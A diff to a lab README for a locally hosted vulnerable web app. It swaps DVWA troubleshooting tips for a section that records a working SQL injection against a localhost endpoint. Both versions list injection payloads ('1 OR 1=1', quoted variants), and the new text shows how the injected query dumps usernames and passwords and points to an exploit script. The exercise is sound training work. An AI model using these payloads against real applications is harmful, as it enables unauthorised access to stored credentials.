@@ -31,15 +31,32 @@ This platform is a **web-based application**.
 
 ---
 
-## Troubleshooting SQL Injection (Common Error)
 
-If you see a MariaDB/MySQL syntax error when testing `1' OR 1=1 --`:
+## Phase 1 Complete: SQL Injection Exploit Working
 
-**Cause**: MySQL requires a space after `--` to treat the rest as a comment.
+### Testing the Exploit Manually
 
-**Solutions**:
-1. Add a trailing space: `1' OR 1=1 -- ` (type a space after the dashes).
-2. Use the universal payload: `1' OR '1'='1` (doesn't require comments).
-3. **Check DVWA Security Level**: Go to the left menu -> "DVWA Security" -> Set to **"Low"** -> Submit.
+The vulnerable app is running at `http://localhost:8080/vuln`.
 
-Once set to "Low" and using the correct syntax, the exploit will work immediately.
+To test the SQL injection manually:
+
+1. **Normal request** (returns only user 1): http://localhost:8080/vuln?id=1
+Output: `[(1, 'admin', 'secretpass')]`
+
+2. **Exploit request** (returns ALL users): http://localhost:8080/vuln?id=1%20OR%201=1
+
+Output: `[(1, 'admin', 'secretpass'), (2, 'john', 'doe123')]`
+
+### Important Note About SQL Injection Payloads
+
+Since the `id` column is an **integer**, you **cannot** use single quotes:
+- ❌ `1' OR '1'='1` → causes an SQL syntax error (Internal Server Error)
+- ✅ `1 OR 1=1` → works perfectly (no quotes needed)
+
+### Automated Exploit Script
+
+The script `scripts/exploit_sqli.py` automatically sends the exploit payload and confirms it works by looking for both `admin` and `john` in the response.
+
+**Run it with:**
+```bash
+python scripts/exploit_sqli.py
